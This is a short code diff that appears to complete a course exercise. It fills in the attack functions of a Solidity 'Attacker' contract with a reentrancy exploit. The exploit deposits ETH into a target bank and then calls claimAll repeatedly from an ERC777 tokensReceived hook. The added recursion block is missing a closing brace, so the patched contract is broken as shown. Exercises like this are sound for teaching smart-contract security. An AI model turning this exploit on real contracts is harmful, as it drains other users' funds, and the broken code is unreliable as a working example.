@@ -35,8 +35,9 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
 	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
+      	require( address(bank) != address(0), "Target bank not set" );
+    	bank.deposit{value: amt}();
+        bank.claimAll();
 	}
 
 	/*
@@ -59,7 +60,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata userData,
 		bytes calldata operatorData
 	) external {
-		//YOUR CODE TO RECURSE GOES HERE
+        if (depth < max_depth) {
+            depth++;
+            emit Recurse(depth);
+            bank.claimAll();
 	}
 
 }
